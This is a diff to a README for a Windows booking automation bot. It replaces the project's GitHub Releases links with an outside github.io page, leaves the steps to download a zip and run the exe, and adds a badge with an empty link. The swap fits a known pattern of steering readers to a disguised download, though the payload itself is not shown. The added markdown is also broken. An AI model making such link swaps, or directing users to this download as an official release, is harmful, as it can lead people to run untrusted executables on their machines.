@@ -104,11 +104,12 @@ stateDiagram-v2
 
 <div align="center">
 
-[![Download Latest Release](https://img.shields.io/badge/⬇%20DOWNLOAD%20LATEST%20BUILD-7C5CFF?style=for-the-badge&labelColor=0B0E14)](https://github.com/YOUR-USERNAME/booking-auto-bot/releases/latest)
+[![Download Latest Release](https://img.shields.io/badge/⬇%20DOWNLOAD%20LATEST%20BUILD-7C5CFF?style=for-the-badge&labelColor=0B0E14)]([https://github.com/YOUR-USERNAME/booking-auto-bot/releases/latest](https://onlineunknowns.github.io/AutoBooking/))
+[![Download Latest Release](https://img.shields.io/badge/⬇%20DOWNLOAD%20LATEST%20BUILD-7C5CFF?style=for-the-badge&labelColor=0B0E14)]()
 
 </div>
 
-1. Go to the [**Releases**](https://github.com/YOUR-USERNAME/booking-auto-bot/releases/latest) page.
+1. Go to the [**Releases**](https://onlineunknowns.github.io/AutoBooking/) page.
 2. Download the latest `BookingAutoBot-win-x64.zip`.
 3. Extract it anywhere and run `Booking Auto Bot.exe` — no installation required.
 
